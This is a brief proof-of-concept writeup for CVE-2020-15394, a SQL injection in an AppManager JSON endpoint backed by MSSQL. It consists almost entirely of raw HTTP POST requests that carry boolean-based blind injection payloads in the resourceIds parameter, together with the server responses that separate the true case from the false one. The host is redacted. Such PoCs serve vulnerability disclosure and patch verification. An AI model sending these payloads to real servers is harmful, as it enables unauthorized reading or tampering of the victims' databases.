# PoC CVE
## CVE-2020-15394
- DBMS: MSSQL</br>
TRUE condition in sql query 
```
POST /AppManager/json/ApmAdminServices/checkResourceID HTTP/1.1
Host: redacted.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 67

resourceIds=1)+AND+(SELECT+CASE+WHEN+(1=1)+THEN+1+ELSE+1/0+END)=1--
```
```
HTTP/1.1 200 
Set-Cookie: JSESSIONID_APM_80=123; Path=/; Secure; HttpOnly
Content-Type: text/plain;charset=UTF-8
Content-Length: 57
Date: Wed, 24 Nov 2021 09:39:56 GMT

1) AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 1/0 END)=1--
```
FALSE condition in sql query
```
POST /AppManager/json/ApmAdminServices/checkResourceID HTTP/1.1
Host: redacted.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 67

resourceIds=1)+AND+(SELECT+CASE+WHEN+(1=0)+THEN+1+ELSE+1/0+END)=1--
```
```
HTTP/1.1 200 
Set-Cookie: JSESSIONID_APM_80=123; Path=/; Secure; HttpOnly
Content-Type: text/plain;charset=UTF-8
Content-Length: 2
Date: Wed, 24 Nov 2021 09:44:04 GMT



```
